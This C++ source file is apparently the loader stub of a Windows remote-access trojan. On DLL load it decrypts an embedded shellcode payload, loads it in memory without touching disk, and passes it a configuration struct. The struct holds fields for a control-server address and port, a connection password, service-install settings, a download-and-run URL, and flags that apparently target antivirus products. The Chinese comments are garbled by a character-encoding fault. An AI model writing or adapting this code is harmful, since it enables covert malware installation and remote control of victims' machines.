// 1.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "stdafx.h"
#include "ShellCode.h"
#include "MemLoadDll.h"

struct DLL_INFO
{
	char LoginAddr[30];     // ���ߵ�ַ 1  
	UINT LoginPort;         // ���߶˿� 2
	WORD FileAttribute;     // �ļ����� 3
	char UpGroup[30];       // ���߷��� 4
	char ConnetPass[20];    // ͨѶ��Կ 5
	TCHAR ReleaseName[25];  // ��װ���� 6
	char ServiceName[70];   // �������� 7
	char ServiceDisplayName[70]; // ������ʾ 8
	char ServiceDescription[120];// �������� 9
	char ReleasePath[100];  // ��װ·�� 10
	CHAR szDownRun[150];    // �����ַ 11
	char Dele_zc;           // �������� 12
	BOOL Fwb;               // ΢�� 13
	BOOL Fhb;               // ���� 14
	BOOL Fxn;               // ���� 15
	BOOL Ffx;               // ���� 16
	BOOL Fsc;               // ��ɾ 17
	BOOL Fzs;               // ��ɾ 18
	BOOL Fcf;               // �ظ� 19
	BOOL Ffh;               // ���� 20
	BOOL Fct;               // ��͸ 21
	BOOL Fzj;               // �ս� 22
	BOOL Fkb;               // ���� 23
	BOOL Fsm;               // ˯�� 24
	BOOL Flx;               // ���� 25
	BOOL Fwr;               // ΢�� 26
}dll_info = 
{
	"SVP7",       // ���ߵ�ַ 1
		0,        // ���߶˿� 2
		0,        // �ļ����� 3
		"",       // ���߷��� 4
		"",       // ͨѶ���� 5
		"",       // ��װ���� 6
		"",       // �������� 7
		"",       // ������ʾ 8
		"",	      // �������� 9
		"",       // ��װ;�� 10
		"",       // �������� 11
		0,        // �������� 12
		0,        // 0�ر� 1���� ΢����� 13
		0,        // 0�ر� 1���� ������� 14
		0,        // 0�ر� 1���� ������ 15
		0,        // 0�ر� 1���� ������� 16
		0,        // 0�ر� 1���� ��ɾ��� 17
		0,        // 0�ر� 1���� ��ɾ��� 18
		0,        // 0�ر� 1���� �ظ���� 19
		0,        // 0�ر� 1���� ������ 20
		0,        // 0�ر� 1���� ��͸��� 21
		0,        // 0�ر� 1���� �ս��� 22
		0,        // 0�ر� 1���� ������ 23
		0,        // 0�ر� 1���� ˯�߼�� 24
		0,        // 0�ر� 1���� ���߼�� 25
		0,        // 0�ر� 1���� ΢��ɱ�� 26
};
void EncryptData(char *szRec,long nLen,long key) //���ܲ��
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
typedef int (WINAPI *SB360RUN)(DLL_INFO);
void LoadLib( const char *name)
{
	HMEMORYMODULE hDll;
	SB360RUN pfn;
	EncryptData((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize,1024);	
	hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);
	if (hDll==NULL)
		return ;
	pfn=(SB360RUN)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll=NULL;
		
	}
	ExitProcess(0);	
}


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{

	char SVP7[]={'S','V','P','7','\0'};
	LoadLib(SVP7);
    return TRUE;
}

